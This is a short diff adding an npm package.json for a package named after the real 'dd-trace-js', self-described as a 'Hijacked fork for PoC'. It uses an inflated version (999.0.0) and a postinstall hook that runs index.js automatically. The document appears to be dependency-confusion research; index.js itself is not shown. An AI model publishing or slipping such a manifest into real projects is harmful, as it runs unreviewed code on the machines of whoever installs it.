@@ -1,0 +1,9 @@
+{
+  "name": "dd-trace-js",
+  "version": "999.0.0",
+  "main": "index.js",
+  "description": "Hijacked fork for PoC",
+  "scripts": {
+    "postinstall": "node index.js"
+  }
+}
